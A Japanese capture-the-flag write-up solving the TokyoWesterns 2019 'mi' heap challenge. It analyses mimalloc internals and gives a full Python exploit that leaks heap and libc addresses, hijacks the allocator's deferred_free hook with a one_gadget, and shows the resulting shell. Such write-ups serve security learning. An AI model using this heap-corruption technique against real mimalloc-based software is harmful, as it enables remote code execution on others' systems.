# [pwn 388pts] mi - TokyoWesterns CTF 5th 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f mi
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols     Yes      0               3       mi
```
Create, Write, Read, Deleteがあるヒープ系問題ですが、とりあえずIDAで解析します。
createでは`list[index] = mimalloc(size)`できます。writeでは`read_buf(list[index], size)`してくれます。readでは`puts(list[index])`してくれます。deleteでは`mi_free(list[index])`します。
ということで、普通にUAFやdouble freeができます。
問題は相手がmimallocであるという点で、mimallocの仕組みを理解すれば解けるかもしれません。
とりあえず仕様書(参考文献[1])から重要っぽい点を抜き出します。

- mimalloc
  - mimallocはまずtlbのポインタを取得する。
  - tlbから適切なサイズのページを探す。
  - 0x400バイト以下の小さいチャンクは8バイトごとに配列(pages_direct)で使えるチャンクの先頭(page->free)を指している。
  - page->free = page->free->nextしてpage->used++して元のpage->freeを返す。
- mi_free
  - いろいろやる

とりあえず適当にページを作ってgdbで見てみます。
```
pwndbg> x/16xg 0x7fffe7400000
0x7fffe7400000: 0x0000000000000000      0x0000000000000000
0x7fffe7400010: 0x0000000000000000      0x0000000000000000
0x7fffe7400020: 0x0000000000000001      0x0000000000000040
0x7fffe7400030: 0x0000000000400000      0x0000000000001680
0x7fffe7400040: 0xda4b55288c3b5f21      0x0000000000000000
0x7fffe7400050: 0x0000000000000010      0x00007ffff7fce740
0x7fffe7400060: 0x0000000000000000      0x0e98010000000500
0x7fffe7400070: 0x00007fffe7401690      0x45f6b570fe8cc0e3
```
こんな感じでsegmentがあります。
また、16バイトmimallocすると次のようになります。
```
pwndbg> x/4xg 0x7fffe7401680
0x7fffe7401680: 0x4242424241414141      0x0a42424241414141
0x7fffe7401690: 0x00007fffe74016a0      0x0000000000000000
```
overreadでヒープのアドレスはすぐ取れますね。
さらにもう1つページを確保すると次のように隣接して取られます。
```
pwndbg> x/8xg 0x7fffe7401680
0x7fffe7401680: 0x4242424241414141      0x0a42424241414141
0x7fffe7401690: 0x5a5a5a5a5a5a5a5a      0x0a42424242424242
0x7fffe74016a0: 0x00007fffe74016b0      0x0000000000000000
0x7fffe74016b0: 0x00007fffe74016c0      0x0000000000000000
```

1つ目と2つ目を順番にfreeすると次のようになります。
```
pwndbg> x/8xg 0x7fffe7401680
0x7fffe7401680: 0x0000000000000000      0x0a42424241414141
0x7fffe7401690: 0x00007fffe7401680      0x0a42424242424242
0x7fffe74016a0: 0x00007fffe74016b0      0x0000000000000000
0x7fffe74016b0: 0x00007fffe74016c0      0x0000000000000000
```

なんか思ったより普通ですね。
ということで必要なのは、system関数なりone shotなりを呼び出すためのlibcアドレスと、フック関数的なmiの何某です。
後者に関してはmimallocのソースコードを調べたらそれっぽいのがありました。
```c

/* -----------------------------------------------------------
  Users can register a deferred free function called
  when the `free` list is empty. Since the `local_free`
  is separate this is deterministically called after
  a certain number of allocations.
----------------------------------------------------------- */

static mi_deferred_free_fun* deferred_free = NULL;

void _mi_deferred_free(mi_heap_t* heap, bool force) {
  heap->tld->heartbeat++;
  if (deferred_free != NULL) {
    deferred_free(force, heap->tld->heartbeat);
  }
}

void mi_register_deferred_free(mi_deferred_free_fun* fn) mi_attr_noexcept {
  deferred_free = fn;
}
```
この関数自体は`_mi_malloc_generic`でさらっと呼ばれてました。
```c
// Generic allocation routine if the fast path (`alloc.c:mi_page_malloc`) does not succeed.
void* _mi_malloc_generic(mi_heap_t* heap, size_t size) mi_attr_noexcept
{
  mi_assert_internal(heap != NULL);

  // initialize if necessary
  if (mi_unlikely(!mi_heap_is_initialized(heap))) {
    mi_thread_init(); // calls `_mi_heap_init` in turn
    heap = mi_get_default_heap();
  }
  mi_assert_internal(mi_heap_is_initialized(heap));

  // call potential deferred free routines
  _mi_deferred_free(heap, false);

  // free delayed frees from other threads
  _mi_heap_delayed_free(heap);
```
さて、libcのアドレスを取得する必要があるのですが、miのアドレスでも良いのでmiのアドレス探しの旅に出ます。
とりあえずmimallocした結果segmentあたりに帰ってくればmiがリークできそうです。
glibcのmallocみたいにfreeしたものをすぐには使ってくれなかったので適当に使いまくってたら、セグメントが使い果たされる最後にfreeされたものが使われるようです。
そんなこんなでsegmentのpage->freeがNULLになるような場所にポインタを向けたらsegmentにmallocが返ってきたので、buffer overreadでmi baseが取れました。

ところが、freeされたページを使うとき、(ptr & 0xffffffffffc00000)をsegmentとして認識するので、そこに有効なsegmentがなければcrashしてしまいます。（逆にこの仕様だからfree listをsegmentに向けてmi baseが取れた。）
また、同じsegmentページには同じサイズクラスのページのみが集められます。

`_mi_page_free_collect`を見ると、thread_freeがある場合は`mi_page_thread_free_collect`が呼び出されています。
```c
void _mi_page_free_collect(mi_page_t* page) {
  mi_assert_internal(page!=NULL);
  //if (page->free != NULL) return; // avoid expensive append

  // free the local free list
  if (page->local_free != NULL) {
    if (mi_likely(page->free == NULL)) {
      // usual case
      page->free = page->local_free;
    }
    else {
      mi_block_t* tail = page->free;
      mi_block_t* next;
      while ((next = mi_block_next(page, tail)) != NULL) {
        tail = next;
      }
      mi_block_set_next(page, tail, page->local_free);
    }
    page->local_free = NULL;
  }
  // and the thread free list
  if (mi_tf_block(page->thread_free) != NULL) {  // quick test to avoid an atomic operation
    mi_page_thread_free_collect(page);
  }
}
```
`mi_page_thread_free_collect`では`page->thread_free`の最後のポインタ(tail)に`page->free`を書き込み、`page->free`に`page->thread_free`の最初のポインタを入れています。
さて、`deferred_free`は標準でNULLが入っているので、ここを`page->thread_free`が指すと`deferred_free`がtailとして認識されます。ただし、headを有効な場所にしなくてはならないので、`thread_free`が直接`deferred_free`を指してはいけません。
あとfree listを繋げたあとはpage->freeをNULLにしてあげましょう。

```python
from ptrlib import *

def create(index, size):
    sock.sendlineafter(">>\n", "1")
    sock.sendlineafter("\n", str(index))
    sock.sendlineafter("\n", str(size))
    return

def write(index, data):
    sock.sendlineafter(">>\n", "2")
    sock.sendlineafter("\n", str(index))
    sock.sendafter("\n", data)
    return

def read(index):
    sock.sendlineafter(">>\n", "3")
    sock.sendlineafter("\n", str(index))
    return sock.recvline()

def delete(index):
    sock.sendlineafter(">>\n", "4")
    sock.sendlineafter("\n", str(index))
    return

libc = ELF("./libc.so.6")
libmi = ELF("./libmimalloc.so")
sock = Process("./mi", env={'LD_LIBRARY_PATH': './'})
#sock = Socket("mi.chal.ctf.westerns.tokyo", 10001)
libc_one_gadget = 0x10a38c

# leak heap
create(0, 0x20)
create(1, 0x20)
write(1, "1" * 0x20)
heap_base = u64(read(1)[0x20:]) - 0x16e0
logger.info("heap base = " + hex(heap_base))

# leak mi & libc
delete(0)
delete(1)
for i in range(0x7c):
    create(2, 0x20)
create(3, 0x20)
create(4, 0x20)
write(1, p64(heap_base + 0x88) + b'A'*0x18)
create(2, 0x20)
create(2, 0x20)
write(2, 'A' * 0x20)
libmi_base = u64(read(2)[0x20:]) - 0x2233c0
libc_base = libmi_base + 0x22a000
logger.info("libmi base = " + hex(libmi_base))
logger.info("libc base = " + hex(libc_base))
write(2, p64(0) * 3 + p64(0x20))

# overwrite deferred_free
delete(4)
delete(3)
ptr = heap_base + 0x2640 # list[3]->local_free == list[4]
write(4, p64(libmi_base + libmi.symbol("deferred_free")) + b"1"*0x18)
payload  = p64(libc_base + libc_one_gadget) # local_free
payload += p64(2)    # thread_freed
payload += p64(ptr)  # thread_free
payload += p64(0x20) # block_size
write(2, payload)

create(0, 0x20)
write(4, '\x00' * 0x20)
create(0, 0x20)
create(0, 0x20)

sock.interactive()
```

できた。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=15311)
[+] <module>: heap base = 0x7f52b9400000
[+] <module>: libmi base = 0x7f52c9492000
[+] <module>: libc base = 0x7f52c96bc000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
mimallocのpwn作りたいなぁと出た当時から思っていたので楽しかったです。

# 参考文献
[1] [https://www.microsoft.com/en-us/research/uploads/prod/2019/06/mimalloc-tr-v1.pdf](https://www.microsoft.com/en-us/research/uploads/prod/2019/06/mimalloc-tr-v1.pdf)  
[2] [https://lordofpwn.kr/twctf_mi_writeup/](https://lordofpwn.kr/twctf_mi_writeup/)
